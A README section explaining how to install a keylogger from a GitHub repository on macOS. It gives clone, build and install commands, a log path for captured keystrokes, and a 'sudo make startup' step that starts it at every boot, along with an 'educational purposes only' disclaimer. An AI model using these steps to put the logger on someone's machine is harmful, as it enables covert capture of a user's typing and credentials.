## Mac
This is a little more complicated, as its Apple after all! Please note, it does not work for secure areas such as password inputs. I have not found a work around yet.

### Installation
Download the repo. It will install in `/usr/local/bin/keylogger`.

Install it:

`$ git clone https://github.com/GiacomoLaw/Keylogger && cd keylogger/mac`

`$ make && make install`

It will log to `/var/log/keystroke.log`. This may require root access, but you can change that if you want. Set where you want it to log:

`$ keylogger ~/logfile.txt`

`Logging to: /var/log/keystroke.log`

Want to make it start on system startup?

`$ sudo make startup`

That will run it on startup.

### Uninstall
`$ sudo make uninstall`
Will uninstall the program, but not the logs.

---

Please feel free to contribute to fix any problems!

Please note, this repo is for educational purposes only. No contributors are to fault for any actions done by this program.

> [If anyone knows where to get a key code list for `c` for `azerty` keyboards, please let me know!](https://github.com/GiacomoLaw/Keylogger/issues/29)

Thanks to [Casey Scarborough](https://github.com/caseyscarborough/keylogger) for the base program!
